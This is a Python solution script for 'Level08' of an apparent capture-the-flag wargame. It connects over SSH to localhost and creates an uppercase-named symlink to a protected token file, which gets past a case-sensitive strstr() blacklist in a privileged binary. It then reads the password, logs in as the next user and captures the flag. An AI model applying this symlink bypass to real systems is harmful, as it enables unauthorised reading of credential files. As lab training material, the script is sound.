"""
Level08 - Case-Sensitive Blacklist Bypass

Objective:
    Bypass case-sensitive blacklist using symlinks to read protected token file.

Vulnerability:
    strstr() blacklist check is case-sensitive, only blocks lowercase "token".

Usage:
    python3 exploit.py
"""

import subprocess
import sys
import re


# ============================================================================
# Helper Functions
# ============================================================================

def ssh_cmd(host, port, user, pwd, cmd):
    """Execute SSH command."""
    try:
        result = subprocess.run(
            [
                "sshpass",
                "-p",
                pwd,
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-p",
                str(port),
                f"{user}@{host}",
                cmd,
            ],
            capture_output=True,
            text=True,
            timeout=10,
        )
        return result.returncode, result.stdout, result.stderr
    except:
        return -1, "", ""


# ============================================================================
# Exploitation
# ============================================================================

def exploit(host, port, ssh_port, pwd):
    """Execute case-sensitive blacklist bypass."""
    print(f"[*] Connecting to level08@{host}:{ssh_port}")
    code, out, err = ssh_cmd(host, ssh_port, "level08", pwd, "id")
    if code != 0:
        print("[!] SSH connection failed")
        return False, "", ""
    print(f"[+] SSH OK: {out.strip()}\n")

    print("[*] Creating symlink with uppercase name to bypass case-sensitive check...")
    cmd = "rm -f /tmp/TOKEN; ln -sf /home/user/level08/token /tmp/TOKEN && /home/user/level08/level08 /tmp/TOKEN"
    code, out, err = ssh_cmd(host, ssh_port, "level08", pwd, cmd)

    flag08_pwd = out.strip()
    if not flag08_pwd or len(flag08_pwd) < 20:
        print(f"[!] Failed to extract password. Output: {(out + err).strip()}")
        return False, "", ""

    print(f"[+] Flag08 password found: {flag08_pwd}\n")

    code, out, err = ssh_cmd(host, ssh_port, "flag08", flag08_pwd, "getflag")
    if code != 0:
        return False, "", ""
    full_output = (out + err).strip()
    for line in full_output.split("\n"):
        if "token" in line.lower():
            for part in line.split():
                if len(part) > 20 and part.isalnum():
                    print(f"[+] Flag found: {part}")
                    return True, part, flag08_pwd
    return False, "", ""


# ============================================================================
# Main
# ============================================================================

def main():
    print("Level08 Case-Sensitive Blacklist Bypass Exploit\n")

    try:
        with open("level07/flag", "r") as f:
            pwd = f.read().strip()
        print(f"[+] Level07 token: {pwd}\n")
    except:
        print("[!] Could not read level07 token")
        sys.exit(1)

    success, token, flag08_pwd = exploit("localhost", 4747, 4242, pwd)

    if success:
        print("\n[SUMMARY]")
        print(f"  Vulnerability: Case-sensitive strstr() blacklist check")
        print(f"  Attack: Symlink with uppercase name bypasses lowercase check")
        print(f"  Result: Reading protected token file\n")
        print(f"[ANSWER]")
        print(f"  Flag08 Password: {flag08_pwd}")
        print(f"  Level08 Token: {token}")

        try:
            with open("level08/flag", "w") as f:
                f.write(token)
            print(f"\n[+] Token saved to level08/flag")
        except Exception as e:
            print(f"[!] Could not save token: {e}")
    else:
        print("[!] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
